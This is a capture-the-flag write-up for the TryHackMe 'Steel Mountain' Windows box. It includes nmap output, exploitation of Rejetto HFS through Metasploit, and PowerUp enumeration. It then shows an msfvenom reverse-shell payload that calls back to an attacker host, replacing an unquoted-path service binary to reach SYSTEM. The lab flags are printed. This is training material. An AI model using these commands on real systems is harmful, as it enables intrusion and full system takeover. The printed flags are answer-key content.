@@ -1,0 +1,358 @@
+root@natzsec:~/Desktop/tryhackme/boxes/steelmountain# nmap -sC -sV -oA nmap/initial  10.10.64.226
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 12:33 IST
+Stats: 0:02:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.96% done; ETC: 12:35 (0:00:01 remaining)
+Nmap scan report for 10.10.64.226
+Host is up (0.42s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Site doesn't have a title (text/html).
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+|_ssl-date: 2020-05-10T07:04:26+00:00; 0s from scanner time.
+8080/tcp  open  http               HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49157/tcp open  msrpc              Microsoft Windows RPC
+49163/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:6c:c9:ce:92:22 (unknown)
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-05-10T07:04:20
+|_  start_date: 2020-05-10T06:56:38
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 136.77 seconds
+
+We can see that there are HTTP, SMB, RDP and HFS also running on the machine.
+
+As we know HFS was already vulnerable to RCE. We can take a look at that.
+
+TASK 2
+
+#1 Scan the machine with nmap. What is the other port running a web server on?
+
+8080
+
+#2 Take a look at the other web server. What file server is running?
+
+Rejetto HTTP File Server
+
+#3 What is the CVE number to exploit this file server?
+
+CVE-2014-6287 => 2014-6278
+
+#4 Use Metasploit to get an initial shell. What is the user flag?
+
+meterpreter > cd Desktop
+meterpreter > dir
+Listing: C:\Users\bill\Desktop
+==============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2019-09-27 16:37:07 +0530  desktop.ini
+100666/rw-rw-rw-  70    fil   2019-09-27 18:12:38 +0530  user.txt
+
+meterpreter > cat user.txt 
+��b04763b6fcf51fcd7c13abc7db4fd365
+meterpreter > shell
+Process 2304 created.
+Channel 3 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\bill\Desktop>more user.txt
+more user.txt
+b04763b6fcf51fcd7c13abc7db4fd365
+
+C:\Users\bill\Desktop>
+
+Flag : b04763b6fcf51fcd7c13abc7db4fd365
+
+Download the PowerUp powershell script. 
+
+Upload it to the current directory.
+
+Initate the powershell from the meterpreter.
+
+meterpreter > pwd
+C:\Users\bill
+meterpreter > cd Desktop
+meterpreter > upload PowerUp.ps1
+[*] uploading  : PowerUp.ps1 -> PowerUp.ps1
+[*] Uploaded 549.65 KiB of 549.65 KiB (100.0%): PowerUp.ps1 -> PowerUp.ps1
+[*] uploaded   : PowerUp.ps1 -> PowerUp.ps1
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > ls       
+
+
+    Directory: C:\Users\bill\Desktop
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---         5/10/2020   2:08 AM     562841 PowerUp.ps1
+-a---         9/27/2019   5:42 AM         70 user.txt
+
+
+PS > . .\PowerUp.ps1
+PS > Invoke-AllChecks
+
+[*] Running Invoke-AllChecks
+
+
+[*] Checking if user is in a local group with administrative privileges...
+
+
+[*] Checking for unquoted service paths...
+
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
+CanRestart     : False
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
+CanRestart     : False
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+
+
+
+
+
+[*] Checking service executable and argument permissions...
+
+
+ServiceName                     : AdvancedSystemCareService9
+Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
+CanRestart                      : True
+
+ServiceName                     : IObitUnSvr
+Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
+CanRestart                      : False
+
+ServiceName                     : LiveUpdateSvc
+Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
+CanRestart                      : False
+
+
+The vulnerable unquoted service path service :
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+
+Task 3
+
+#2 Take close attention to the CanRestart option that is set to true. What is the name of the unquoted service path service name?
+
+AdvancedSystemCareService9
+
+#3 Root Flag:
+
+First create a msfvenom payload with the name of the service it self
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= 10.11.5.22 LPORT=1337 -f exe -o ASCService.exe
+
+Then stop the service and place our payload at the service's binary path.
+
+meterpreter > shell
+Process 3732 created.
+Channel 4 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
+sc stop AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>sc.exe stop AdvancedSystemCareService9
+sc.exe stop AdvancedSystemCareService9
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>sc qc AdvancedSystemCareService9
+sc qc AdvancedSystemCareService9
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: AdvancedSystemCareService9
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+        LOAD_ORDER_GROUP   : System Reserved
+        TAG                : 1
+        DISPLAY_NAME       : Advanced SystemCare Service 9
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>^C
+Terminate channel 4? [y/N]  y
+meterpreter > upload ASCService.exe
+[*] uploading  : ASCService.exe -> ASCService.exe
+[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): ASCService.exe -> ASCService.exe
+[*] uploaded   : ASCService.exe -> ASCService.exe
+meterpreter > shell
+Process 2348 created.
+Channel 6 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
+sc start AdvancedSystemCareService9
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
+sc start AdvancedSystemCareService9
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>
+
+
+
+Then start the service using sc start AdvancedSystemCareService9 which will give us a reverse shell in our meterpreter shell.
+
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.11.5.22:1337 
+[*] Sending stage (180291 bytes) to 10.10.165.203
+[*] Meterpreter session 2 opened (10.11.5.22:1337 -> 10.10.165.203:49310) at 2020-05-10 14:52:38 +0530
+
+
+
+
+meterpreter > 
+meterpreter > 
+meterpreter > 
+meterpreter > migrate -N spoolsv.exe
+[*] Migrating from 3864 to 1216...
+[*] Migration completed successfully.
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > pwd
+C:\Windows\system32
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd Users
+meterpreter > cd Administrator
+meterpreter > cd Desktop
+meterpreter > ls
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2019-09-26 19:41:25 +0530  desktop.ini
+100666/rw-rw-rw-  32    fil   2019-09-27 18:10:56 +0530  root.txt
+
+meterpreter > cat root.txt 
+9af5f314f57607c00fd09803a587db80meterpreter > z
+
+We have migrate the process to any other process because the service started at another shell will die any time so I have migrated the process to spoolsv which is a printer service and even if it crashes it will start automatically.
+
+flag: 9af5f314f57607c00fd09803a587db80
